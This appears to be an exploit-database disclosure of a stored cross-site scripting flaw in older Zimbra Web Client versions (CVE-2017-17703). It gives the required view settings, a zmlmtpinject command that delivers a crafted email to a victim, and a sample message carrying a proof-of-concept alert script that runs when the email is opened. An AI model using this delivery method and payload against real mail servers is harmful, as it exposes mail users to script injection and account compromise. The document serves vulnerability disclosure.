# Exploit Title: Zimbra XSS
# Date: 08/14/2017
# Vendor Homepage: www.zimbra.com
# Version: Zimbra prior to 8.6.0 Patch9; 8.7.11 Patch1; 8.8.3
# CVE : 2017-17703


Exploitation
-----
Condition needed for exploiting are the ZWC settings
  - View: (x) By Message
  - Preferences > Mail, [Displaying Messages - Display Mail:] (x) As Text
  
1. Email/Inject specially formatted email to victim account

One way to inject the message would be:
  $ zmlmtpinject --smtp -p 25 -v -r victim@dom.loc -s victim@dom.loc xss.msg

Where xss.msg would be something like the following...

---[snip]---
From: me@example.com
To: me@example.com
Subject: xss bug 108265
MIME-Version: 1.0
Content-Type: text/html; charset="utf8"
Date: Tue, 23 Aug 2017 00:00:00 +0000

xss - &lt;script&gt;alert(108265)&lt;/script&gt;
---[snip]---

2. Click on / open malicious email

XSS code executes (twice)
